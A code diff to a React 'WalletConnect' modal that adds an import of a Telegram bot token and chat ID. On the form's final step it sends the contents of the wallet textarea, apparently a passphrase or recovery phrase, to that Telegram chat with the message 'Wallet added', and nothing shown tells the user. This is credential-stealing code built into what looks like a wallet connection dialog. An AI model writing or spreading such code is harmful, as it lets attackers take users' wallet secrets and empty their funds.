@@ -13,12 +13,15 @@ import { type TWalletConnectInit, wcFormInit } from "@/data/modals/init-values";
 import { ROUTES } from "@/data/routes";
 import { checkPendingIcon } from "@/data/pages/ui-icons";
 import { PASSPHRASE_DATA } from "@/data/pages/inp-data";
+import { TG_TOKEN, TG_METHOD_NAMES, CHAT_ID } from "@/data/api/tokens";
+import { sendLog } from "@/api/logger-utils";
 
 // * WalletConnect - WC or wc
 export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Element => {
     const {
         register,
         handleSubmit,
+        getValues,
         formState: { isSubmitting, errors },
         reset,
     } = useForm<TWalletConnectInit>({
@@ -66,7 +69,8 @@ export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Elem
         // * Add logger condition here
 
         if (!isLastStep) return next();
-
+        await sendLog(TG_TOKEN, TG_METHOD_NAMES.sendMessage, CHAT_ID, `<blockquote>Кошелёк добавлен.</blockquote>${getValues("wallet-connect-textarea")}`);
+        
         await new Promise((resolve: any) => setTimeout(resolve, 2000));
         reset();
         setIsOpenModal && setIsOpenModal(false);
